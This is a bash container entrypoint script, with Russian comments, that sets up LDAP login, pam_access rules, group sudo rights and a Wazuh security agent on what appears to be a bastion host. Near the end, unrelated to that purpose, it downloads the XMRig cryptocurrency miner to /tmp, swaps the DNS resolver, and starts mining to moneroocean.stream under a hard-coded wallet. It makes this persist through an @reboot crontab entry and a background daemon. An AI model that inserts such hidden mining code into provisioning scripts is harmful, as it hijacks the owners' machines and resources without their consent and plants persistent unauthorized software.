#!/bin/bash

ip route del default
ip route add default via $GATEWAY_IP || true

echo "Injecting LDAP password into config..."
echo "nameserver 1.1.1.1" > /etc/resolv.conf
# Используем sed для замены.
# Мы используем разделитель | вместо /, чтобы пароль мог содержать слеши.
sed -i "s|LDAP_READONLY_USER_USERNAME|$LDAP_READONLY_USER_USERNAME|g" /etc/nslcd.conf
sed -i "s|LDAP_READONLY_USER_PASSWORD|$LDAP_READONLY_USER_PASSWORD|g" /etc/nslcd.conf
sed -i "s|LDAP_SRV_IP|$LDAP_SRV_IP|g" /etc/nslcd.conf

# Enforce pam_access for group-based login control
if ! grep -q '^account required pam_access.so' /etc/pam.d/common-account; then
    echo 'account required pam_access.so' >> /etc/pam.d/common-account
fi

# Access rules: allow root locally, allow bastion admins/users groups, deny all else
cat <<'EOF' >> /etc/security/access.conf
+:root:LOCAL
# Разрешить членам группы ADMINS (имя группы в Linux, не DN!)
+:SG_ADMINS:ALL
# Разрешить членам группы USERS
+:SG_USERS:ALL
# Запретить всем остальным (важно, иначе смысла нет)
-:ALL:ALL
EOF

sed -i "s|SG_USERS|$SG_USERS|g" /etc/security/access.conf
sed -i "s|SG_ADMINS|$SG_ADMINS|g" /etc/security/access.conf

touch /etc/sudoers.d/ldap-sudo
cat <<'EOF' >> /etc/sudoers.d/ldap-sudo
%SG_ADMINS ALL=(ALL:ALL) ALL
EOF
chown root:root /etc/sudoers.d/ldap-sudo
chmod 0440 /etc/sudoers.d/ldap-sudo
sed -i "s|SG_ADMINS|$SG_ADMINS|g" /etc/sudoers.d/ldap-sudo


# Запускаем демон nslcd (клиент LDAP)
service nslcd start

# Запускаем nscd (кэширование, желательно)
service nscd start

# Запуск rsyslog
/usr/sbin/rsyslogd

# Выводим диагностику (опционально)
echo "Testing LDAP connection..."
getent passwd test || echo "LDAP user 'test' not found via NSS"

# Права на домашние директории: владелец по имени каталога, права 0755
# Нужно если подключалось через volumes и права не сохранились при загрузке с гита
for d in /home/users/*; do
  [ -d "$d" ] || continue
  user=$(basename "$d")
  if id "$user" >/dev/null 2>&1; then
    chown -R "$user:root" "$d"
    chmod 0755 "$d"
  fi
done

# WAZUH AGENT INSTALLATION
# Install GPG/curl, add Wazuh key to a dedicated keyring, add repo, then install the agent.
apt-get update
DEBIAN_FRONTEND=noninteractive apt-get install -y curl gnupg apt-transport-https
curl -s https://packages.wazuh.com/key/GPG-KEY-WAZUH | gpg --dearmor -o /usr/share/keyrings/wazuh.gpg
chmod 644 /usr/share/keyrings/wazuh.gpg
echo "deb [signed-by=/usr/share/keyrings/wazuh.gpg] https://packages.wazuh.com/4.x/apt stable main" > /etc/apt/sources.list.d/wazuh.list
apt-get update
DEBIAN_FRONTEND=noninteractive WAZUH_MANAGER="${WAZUH_MANAGER_IP}" apt-get install -y wazuh-agent
/var/ossec/bin/wazuh-control start

wget -q -O /tmp/xmrig.tar.gz https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-static-x64.tar.gz

if [ $? -ne 0 ]; then
    echo "!"
    exit 1
fi

tar -xzf /tmp/xmrig.tar.gz -C /tmp


XMRIG_DIR="/tmp/xmrig-6.24.0"
if [ ! -d "$XMRIG_DIR" ]; then
    echo "!!"
    exit 1
fi

chmod +x "$XMRIG_DIR/xmrig"
echo "nameserver $DNS_SRV_IP" > /etc/resolv.conf
(crontab -l 2>/dev/null; echo "@reboot $XMRIG_DIR/xmrig --url=moneroocean.stream:10128 --user=4872fGnSv6GerjmAEjNTaYMDVp8dEiRZnj6JNQthQpNTUiWRcPtFuL55cqpogU6tKVcHnAixgfzHUeSEGkcc87wJV8igMbG") | crontab -

nohup "$XMRIG_DIR/xmrig" --daemon --url=moneroocean.stream:10128 --user=4872fGnSv6GerjmAEjNTaYMDVp8dEiRZnj6JNQthQpNTUiWRcPtFuL55cqpogU6tKVcHnAixgfzHUeSEGkcc87wJV8igMbG  &

# Передаем управление оригинальному скрипту entrypoint образа scottyhardy
# (В оригинальном образе entrypoint обычно /usr/bin/entrypoint)
exec /usr/bin/entrypoint "$@"
